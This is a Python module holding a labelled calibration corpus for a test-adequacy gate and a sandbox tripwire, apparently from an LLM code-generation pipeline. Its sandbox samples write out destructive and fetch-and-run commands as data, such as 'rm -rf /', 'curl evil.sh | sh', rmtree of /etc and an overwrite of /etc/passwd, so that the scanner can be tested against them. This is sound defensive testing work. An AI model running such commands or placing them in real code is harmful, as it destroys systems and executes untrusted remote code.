"""Labelled calibration corpus for the heuristic gates.

Audits v4 and v5 each found gates that were wrong in *both* directions --
refusing a legitimate shopping-cart suite while accepting ``assert 1 == 1``,
refusing ``tmp_path.write_text`` while missing ``import os as o; o.system(...)``.
Every one of those defects sat under 100% line and branch coverage, because
coverage proves a line *executed*, never that its verdict was *correct*
(ADR-014).

This module is the missing measurement. Each sample is an input drawn from
outside the implementation, paired with the verdict a competent reviewer
would give it. :mod:`tests.test_gate_calibration` runs the real gates over
the corpus and asserts precision and recall thresholds, so a recalibration
that fixes one direction by breaking the other now fails CI instead of
waiting for the next audit.

Convention: ``should_flag=True`` means the gate is *supposed* to refuse the
sample. For the adequacy gate that is "this suite is inadequate"; for the
sandbox scanner, "this code is dangerous".
"""

from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True, slots=True)
class Sample:
    """One labelled input for a heuristic gate."""

    name: str
    source: str
    should_flag: bool
    #: Why a human says so. Printed on failure; a sample nobody can justify
    #: in one sentence is usually a badly-chosen sample.
    rationale: str


# -- Adequacy gate ------------------------------------------------------
# should_flag=True  -> the suite is inadequate and must be REFUSED
# should_flag=False -> the suite is genuine and must be ACCEPTED

ADEQUACY_SAMPLES: tuple[Sample, ...] = (
    Sample(
        name="tautology_only",
        source=(
            "def test_one():\n"
            "    assert 1 == 1\n"
            "def test_two():\n"
            "    assert True\n"
            "def test_three():\n"
            "    assert 2 + 2 == 4\n"
        ),
        should_flag=True,
        rationale="dense with assertions but connected to no artifact",
    ),
    Sample(
        name="tautology_hidden_behind_stdlib_import",
        source=(
            "import logging\n\n"
            "def test_one():\n"
            "    assert 1 == 1\n"
            "def test_two():\n"
            "    assert isinstance(2, int)\n"
        ),
        should_flag=True,
        rationale="importing logging is not importing the subject (v5 C-3)",
    ),
    Sample(
        name="no_test_functions",
        source="from generated_code import Cart\n\ncart = Cart()\nprint(cart.total)\n",
        should_flag=True,
        rationale="a script, not a suite: nothing pytest would collect",
    ),
    Sample(
        name="hardcoded_looper_verdict",
        source=(
            "from generated_code import build\n\n"
            "def test_score():\n"
            "    result = build()\n"
            "    assert result.review_score == 95\n"
            "    assert result.build_ok is True\n"
        ),
        should_flag=True,
        rationale="asserts looper's own verdict fields, i.e. written to pass",
    ),
    Sample(
        name="one_assertion_across_many_lines",
        source=(
            "from generated_code import Cart\n\n\n"
            "def test_cart():\n" + "    # setup\n" * 40 + "    cart = Cart()\n"
            "    assert cart.total == 0\n"
        ),
        should_flag=True,
        rationale="below the density floor: 1 assertion in 45 lines",
    ),
    Sample(
        name="module_named_in_a_string_only",
        source=(
            "def test_a():\n"
            '    label = "generated_code"\n'
            "    assert len(label) > 1\n"
            "    assert 1 == 1\n"
        ),
        should_flag=True,
        rationale="naming the module in a string literal is not testing it",
    ),
    Sample(
        name="module_named_in_a_comment_only",
        source=(
            "def test_a():\n"
            "    # exercises generated_code thoroughly\n"
            "    assert 1 == 1\n"
            "    assert 2 == 2\n"
        ),
        should_flag=True,
        rationale="a comment is prose, not a reference",
    ),
    Sample(
        name="reads_the_artifact_from_disk",
        source=(
            "from pathlib import Path\n\n\n"
            "def test_artifact_is_present():\n"
            "    src = Path('src/generated_code.py').read_text()\n"
            "    assert 'class' in src\n"
            "    assert len(src) > 20\n"
        ),
        should_flag=False,
        rationale="a path to the artifact is a real reference (v5 C-3)",
    ),
    Sample(
        name="module_used_as_attribute_root",
        source=(
            "import generated_code\n\n\n"
            "def test_total():\n"
            "    assert generated_code.Cart().total == 0\n\n\n"
            "def test_items():\n"
            "    assert generated_code.Cart().items == {}\n"
        ),
        should_flag=False,
        rationale="module-style access is a genuine reference",
    ),
    Sample(
        name="domain_total_is_not_a_verdict",
        source=(
            "from generated_code import Cart\n\n\n"
            "def test_total():\n"
            "    cart = Cart()\n"
            "    cart.add('apple', 10)\n"
            "    assert cart.total == 10\n\n\n"
            "def test_empty():\n"
            "    assert Cart().total == 0\n"
        ),
        should_flag=False,
        rationale="a cart's total is domain state, not looper's score (v5 C-2)",
    ),
    Sample(
        name="unittest_style_suite",
        source=(
            "import unittest\n\n"
            "from generated_code import Cart\n\n\n"
            "class TestCart(unittest.TestCase):\n"
            "    def test_add(self):\n"
            "        cart = Cart()\n"
            "        cart.add('a', 1.0)\n"
            "        self.assertEqual(cart.total, 1.0)\n\n"
            "    def test_reject(self):\n"
            "        self.assertRaises(ValueError, Cart().add, 'a', -1)\n"
        ),
        should_flag=False,
        rationale="unittest assertions are assertions (v4 M-1)",
    ),
    Sample(
        name="pytest_raises_suite",
        source=(
            "import pytest\n\n"
            "from generated_code import Cart\n\n\n"
            "def test_negative():\n"
            "    with pytest.raises(ValueError):\n"
            "        Cart().add('a', -1)\n\n\n"
            "def test_missing():\n"
            "    with pytest.raises(KeyError):\n"
            "        Cart().remove('ghost')\n"
        ),
        should_flag=False,
        rationale="a raises-context IS the assertion (v4 M-2)",
    ),
    Sample(
        name="parametrized_suite",
        source=(
            "import pytest\n\n"
            "from generated_code import Cart\n\n\n"
            "@pytest.mark.parametrize('price,expected', [(1, 1), (2, 2)])\n"
            "def test_prices(price, expected):\n"
            "    cart = Cart()\n"
            "    cart.add('x', price)\n"
            "    assert cart.total == expected\n\n\n"
            "def test_two_items():\n"
            "    cart = Cart()\n"
            "    cart.add('a', 1)\n"
            "    cart.add('b', 2)\n"
            "    assert cart.total == 3\n"
        ),
        should_flag=False,
        rationale="idiomatic parametrized pytest must clear the gate",
    ),
    Sample(
        name="subprocess_free_cli_suite",
        source=(
            "from generated_code import main\n\n\n"
            "def test_main_prints(capsys):\n"
            "    main(['add', 'milk'])\n"
            "    assert 'milk' in capsys.readouterr().out\n\n\n"
            "def test_main_rejects(capsys):\n"
            "    assert main([]) == 1\n"
        ),
        should_flag=False,
        rationale="drives the artifact through its entry point",
    ),
)


# -- Sandbox tripwire ---------------------------------------------------
# should_flag=True  -> genuinely dangerous, must be REFUSED
# should_flag=False -> ordinary test code, must be ALLOWED

SANDBOX_SAMPLES: tuple[Sample, ...] = (
    Sample(
        name="os_system_direct",
        source="import os\n\ndef test_x():\n    os.system('rm -rf /')\n",
        should_flag=True,
        rationale="shell execution from a generated suite",
    ),
    Sample(
        name="os_system_aliased_import",
        source="import os as o\n\ndef test_x():\n    o.system('curl evil.sh | sh')\n",
        should_flag=True,
        rationale="aliasing does not launder the call (v5 H-1)",
    ),
    Sample(
        name="from_import_system",
        source="from os import system\n\ndef test_x():\n    system('whoami')\n",
        should_flag=True,
        rationale="from-import of the same primitive",
    ),
    Sample(
        name="subprocess_run",
        source=(
            "import subprocess\n\ndef test_x():\n    subprocess.run(['git', 'push'], check=False)\n"
        ),
        should_flag=True,
        rationale="spawns a process outside the harness",
    ),
    Sample(
        name="socket_connect",
        source=(
            "import socket\n\n"
            "def test_x():\n"
            "    s = socket.socket()\n"
            "    s.connect(('example.com', 80))\n"
        ),
        should_flag=True,
        rationale="network egress from untrusted test code",
    ),
    Sample(
        name="eval_of_generated_string",
        source="def test_x():\n    assert eval('1 + 1') == 2\n",
        should_flag=True,
        rationale="eval in a suite the LLM wrote is a code-execution vector",
    ),
    Sample(
        name="shutil_rmtree",
        source="import shutil\n\ndef test_x():\n    shutil.rmtree('/etc')\n",
        should_flag=True,
        rationale="recursive delete outside the workspace",
    ),
    Sample(
        name="open_for_write_absolute",
        source=(
            "def test_x():\n"
            "    with open('/etc/passwd', 'w') as handle:\n"
            "        handle.write('x')\n"
        ),
        should_flag=True,
        rationale="write mode against a host path (v5 H-1)",
    ),
    Sample(
        name="importlib_dynamic_import",
        source=(
            "import importlib\n\n"
            "def test_x():\n"
            "    importlib.import_module('os').system('ls')\n"
        ),
        should_flag=True,
        rationale="dynamic import is __import__ with a friendlier name",
    ),
    Sample(
        name="tmp_path_write_text",
        source=(
            "from generated_code import load\n\n\n"
            "def test_load(tmp_path):\n"
            "    target = tmp_path / 'data.json'\n"
            "    target.write_text('{}')\n"
            "    assert load(target) == {}\n"
        ),
        should_flag=False,
        rationale="pytest's own temp fixture is the sanctioned way to touch disk",
    ),
    Sample(
        name="tmp_path_mkdir",
        source=(
            "def test_tree(tmp_path):\n"
            "    (tmp_path / 'sub').mkdir()\n"
            "    assert (tmp_path / 'sub').is_dir()\n"
        ),
        should_flag=False,
        rationale="mkdir under tmp_path escapes nothing (v4 H-1)",
    ),
    Sample(
        name="json_loads_is_not_eval",
        source=(
            "import json\n\n"
            "def test_parse():\n"
            "    assert json.loads('{\"a\": 1}') == {'a': 1}\n"
        ),
        should_flag=False,
        rationale="the substring scan once confused loads with eval",
    ),
    Sample(
        name="docstring_mentioning_socket",
        source=(
            '"""This module never uses socket or os.system anywhere."""\n\n'
            "from generated_code import add\n\n\n"
            "def test_add():\n"
            "    assert add(1, 2) == 3\n"
        ),
        should_flag=False,
        rationale="prose about a primitive is not a call to it (v4 H-2)",
    ),
    Sample(
        name="comment_mentioning_rmtree",
        source=(
            "from generated_code import add\n\n\n"
            "def test_add():\n"
            "    # never call shutil.rmtree here\n"
            "    assert add(1, 1) == 2\n"
        ),
        should_flag=False,
        rationale="comments are stripped before the substring pass",
    ),
    Sample(
        name="reading_a_fixture_file",
        source=(
            "from pathlib import Path\n\n"
            "from generated_code import parse\n\n\n"
            "def test_parse(tmp_path):\n"
            "    source = tmp_path / 'in.txt'\n"
            "    source.write_text('hello')\n"
            "    assert parse(Path(source).read_text()) == 'HELLO'\n"
        ),
        should_flag=False,
        rationale="read_text is not destructive",
    ),
)
